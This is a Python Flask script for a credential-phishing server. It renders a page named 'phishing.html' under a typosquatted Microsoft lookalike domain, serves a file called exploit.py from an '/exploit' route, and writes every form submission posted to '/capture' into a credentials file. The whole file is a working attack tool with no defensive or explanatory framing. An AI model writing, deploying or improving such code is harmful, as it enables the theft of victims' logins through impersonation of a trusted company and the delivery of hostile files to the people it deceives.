from flask import Flask, request, render_template, send_from_directory
import os
import json

with open('config.json') as f:
    config = json.load(f)

app = Flask(__name__)
creds_file = 'creds.txt'

@app.route('/')
def index():
    return render_template('phishing.html', domain="rnicrosoftofficial.netlify.app")

@app.route('/exploit')
def exploit():
    return send_from_directory('static', 'exploit.py')

@app.route('/capture', methods=['POST'])
def capture():
    data = request.form.to_dict()
    with open(creds_file, 'a') as f:
        f.write(json.dumps(data) + '\n')
    return '', 204

if __name__ == '__main__':
    # Fix SSL context issue
    if config['ssl']:
        try:
            app.run(host='0.0.0.0', port=config['port'], 
                   ssl_context=('cert.pem', 'key.pem'))
        except FileNotFoundError:
            print("SSL certificates not found. Starting without SSL.")
            app.run(host='0.0.0.0', port=config['port'])
    else:
        app.run(host='0.0.0.0', port=config['port'])